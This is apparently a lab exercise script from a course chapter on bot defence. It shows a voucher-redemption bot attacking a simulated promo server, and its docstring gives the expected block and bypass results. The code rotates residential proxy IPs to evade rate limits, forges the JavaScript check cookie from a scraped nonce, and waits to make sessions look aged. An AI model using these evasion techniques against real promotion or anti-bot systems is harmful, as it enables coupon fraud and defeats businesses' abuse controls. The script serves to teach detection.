"""
Chapter 5, Round 3 attack: go straight for the voucher.

The bot still unlocks each session (so the server-side state is real), but it skips everything a
human does: it never loads the home page, never runs the one-line JavaScript, and redeems the
instant it unlocks. It rotates residential IPs so Round 2's velocity limit never fires.

Those three omissions are exactly what the session signals read, so the guard stops it.

  --reimplement-js   do the human-looking things cheaply in Python: load "/", read the nonce out
                     of the page and set js_ok yourself, then wait a few seconds before redeeming.
                     No single session signal fires, and the redeem goes through.

Expected:
  level 2            12/12 (no session guard yet)
  level 3            0/12: no_landing + no_js_cookie + session_too_young add up to a block
  level 3 --reimplement-js   12/12: each signal beaten on its own

    python attacks/round3_straight_to_redeem.py
"""

import argparse
import os
import re
import sys
import time
from collections import Counter

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import promokit as pk  # noqa: E402
from labclient import world_pool  # noqa: E402

ATTEMPTS = 12
NONCE_RE = re.compile(r'var n = "([0-9a-f]+)"')


def run(reimplement_js=False):
    pool = world_pool("residential_proxy_net")
    name = "r3_reimplement_js" if reimplement_js else "r3_straight"
    sig, succeeded = Counter(), 0
    for i in range(ATTEMPTS):
        c = pk.new_client(f"bot:{name}", ip=pool[i % len(pool)])
        if reimplement_js:
            r = c.get("/", pk.browser_headers("typed"))                 # a landing page
            m = NONCE_RE.search(r.text)
            if m:
                c.set_cookie("js_ok", m.group(1)[::-1])                 # re-implement the one-line script
            c.get("/promo/", pk.browser_headers("link", pk.BASE_URL + "/"))
        pk.unlock(c)
        if reimplement_js:
            time.sleep(3.3)                                             # let the session look its age
        r = pk.redeem(c)
        if r.status_code == 200 and "voucher" in r.text:
            succeeded += 1
        pk.tally(c, sig)
    return pk.report(name, ATTEMPTS, succeeded, signals=sig)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--reimplement-js", action="store_true", help="land, set js_ok and wait, all in Python")
    run(**vars(ap.parse_args()))
